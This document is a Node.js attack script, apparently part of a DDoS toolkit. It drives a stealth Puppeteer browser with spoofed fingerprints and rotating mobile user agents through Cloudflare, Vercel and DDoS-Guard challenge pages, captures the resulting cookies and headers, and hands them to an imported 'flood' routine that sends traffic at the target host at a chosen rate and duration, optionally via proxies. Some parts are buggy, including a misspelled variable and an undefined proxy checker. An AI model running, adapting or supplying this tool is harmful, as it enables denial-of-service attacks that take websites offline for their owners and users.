const { connect } = require('puppeteer-real-browser');
const fs = require("fs")
const os = require('os');
const flood = require('./flood');

var HeadersBrowser = '';
let startTime = '';

const host = process.argv[2];
const duration = process.argv[3];
const rates = process.argv[4];
const args = process.argv.slice(5);

const getArgValue = (name) => {
  const index = args.indexOf(name);
  return index !== -1 && args[index + 1] && !args[index + 1].startsWith('--') ? args[index + 1] : null;
};
const getArgFlag = (name) => args.includes(name);

const dratelimitArg = getArgFlag('--dratelimit');
const emulationArg = getArgValue('--emulation');
const headersArg = getArgValue('--headers');
const headlessArg = getArgValue('--headless');
const optimizeArg = getArgFlag('--optimize');
const proxyFile = getArgValue('--proxy');

const headers_types = ['basic', 'undetect'];
const headlessModes = ['legacy', 'new', 'shell', 'true', 'false'];

if (headersArg && !headers_types.includes(headersArg)) {
  console.error(`[INFO] Invalid headers type(s): ${headersArg}`);
  console.error(`[INFO] Headers valid types: ${headers_types.join(', ')}`);
  process.exit(1);
}
if (headlessArg && !headlessModes.includes(headlessArg)) {
  console.error(`[INFO] Invalid headless mode: ${headlessArg}`);
  console.error(`[INFO] Valid modes: ${headlessModes.join(', ')}`);
  process.exit(1);
}
const dratelimit = dratelimitArg || false;
const emulation = emulationArg || false;
const headers = headersArg || false;
const headless = headlessArg || 'new';
const optimize = optimizeArg || false;

const userAgents = [
'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Mi 11 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Galaxy S22 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Xiaomi Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; Realme GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Vivo X90 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; ASUS ROG Phone 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 14; Nothing Phone 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
/*'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',*/
];

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

async function Browser() {
  const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
  const { page, browser } = await connect({
    args: [
      
      "--no-sandbox",
      "--no-first-run",
      "--test-type",
      "--disable-browser-side-navigation",
      "--disable-blink-features=AutomationControlled",
      "--disable-extensions",
      "--disable-gpu",
      "--disable-dev-shm-usage",
      "--disable-features=IsolateOrigins",
      "--no-zygote",
      "--ignore-certificate-errors",
      "--user-agent=" + userAgent,
    ],
    headless: 'auto',
    fingerprint: true,
    turnstile: true,
    tf: true
  });
  try {
    const BrowserPage = await page.goto(host, { waitUntil: 'domcontentloaded' });
    console.log(`[INFO] Browser Opening Host Page ${host}`);
    const status = await BrowserPage.status();
    console.log(`[INFO] Status Code: ${status}`);

    await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});

    console.log(`[INFO] Page loaded: ${page.url()}`);

//    await sleep(3);

    const title = await page.evaluate(() => document.title);
    console.log(`[INFO] Title: ${title}`);
    await sleep(3);
    if (['Just a moment...', 'Checking your browser...', '安全检查中……'].includes(title)) {
      await page.on('response', async resp => {
         HeadersBrowser = resp.request().headers();
      });
      console.log(`[INFO] Detected Protection ~ Cloudflare Interactive Challenge(Captcha)`);
      await sleep(6);
//          await bypassCFChallenge(browser, page);
    } else if (['Attention Required! | Cloudflare'].includes(title)) {
        console.log("[INFO] Blocked by Cloudflare");
        //await browser.close();
    };

    const PageTitle = await page.title().catch(() => "Failed to get title");
    console.log(`[INFO] Page Title: ${PageTitle}`);

//    const userAgent = await page.evaluate(() => navigator.userAgent);
    const cookies = await page.cookies();

    if (cookies.length > 0) {
      const _cookie = cookies.map((c) => `${c.name}=${c.value}`).join("; ");
      console.log(`[INFO] UserAgent: ${userAgent}`);
      console.log(`[INFO] Cookies: ${_cookie}`);
    }
    return {
      title: PageTitle,
      headersall: HeadersBrowser,
      cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
      userAgent: userAgent,
//      proxy: proxy,
    };
    console.log(HeadersBrowser)
  } catch (error) {
    console.error("Error:", error);
  } finally {
    await browser.close();
  }
}

async function Start(host, proxy = null) {
  try {
     const response = await Browser();
     if (response) {
       if (['Just a moment...', 'Checking your browser...', '安全检查中……', 'Vercel Security Checkpoint', 'Just a moment please...', 'You are being redirected...', 'DDoS-Guard'].includes(response.title)) {
         console.log("[INFO] Failed to bypass");
         await Start(host, response.proxy);
         return;       }
       const elapsedTime = (Date.now() - startTime) / 1000;
       console.log(`[INFO] Bypass successful in ${elapsedTime} seconds`);
       const timeout = setTimeout(async () => {
         console.log(`[INFO] Stopping browser and flood process.`);
         process.exit(0);
         }, duration * 1000);
//       await sleep(1000);
       if (proxyFile) {
         flood(host, duration, rates, response.userAgent, response.cookies, response.headersall, response.proxy, dratelimt);
       } else {
        flood(host, duration, rates, response.userAgent, response.cookies, response.headersall, proxy=null, dratelimit);
       }
     }
  } catch (error) {
    console.log(`[ERROR] ${error}`);
  }
}

async function RunWithProxy(proxyFile) {
  const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').map(line => line.trim());
  const fileContent = fs.readFileSync(proxyFile, 'utf-8');
  for (let proxy of proxies) {
    const isActive = await checkProxy(proxy);
    if (isActive) {
      console.log(`[INFO] Proxy ${proxy} active`);
      await Start(host);
      break;
    }
  }
}

if (proxyFile) {
  RunWithProxy(proxyFile);
} else {
//  Start(host);
  Start(host);
}

//Browser();
